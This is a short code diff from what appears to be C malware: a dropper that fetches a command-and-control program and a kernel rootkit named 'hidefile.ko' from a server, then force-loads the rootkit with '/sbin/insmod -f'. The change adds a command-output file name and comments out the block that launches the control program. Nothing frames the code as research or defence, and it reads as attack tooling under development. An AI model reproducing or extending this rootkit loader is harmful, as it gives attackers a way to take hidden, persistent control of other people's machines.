@@ -14,6 +14,7 @@
 #define BUFFER_SIZE 4096
 #define SP_PORT     8890
 #define SERVER_ADDR "127.0.0.1"
+#define CMD_RESULT "cmdoutput.txt"
 char* ROOTKIT = "hidefile.ko";   
 char* CCPROGRAM = "ccprogram";  
 char buf[BUFFER_SIZE];
@@ -35,10 +36,10 @@ int main()
     int rv;
     
     rv = obtain(CCPROGRAM);
-    memcpy(buf, "./", 2);
-    memcpy(buf, CCPROGRAM, strlen(CCPROGRAM));
-    char *ccargs[] = {buf, NULL};
-    if(rv == 0) execcmd(ccargs);
+//    memcpy(buf, "./", 2);
+//    memcpy(buf, CCPROGRAM, strlen(CCPROGRAM));
+//    char *ccargs[] = {buf, NULL};
+//    if(rv == 0) execcmd(ccargs);
     
     rv = obtain(ROOTKIT);
     char *rktargs[] = {"/sbin/insmod", "-f", ROOTKIT, NULL};
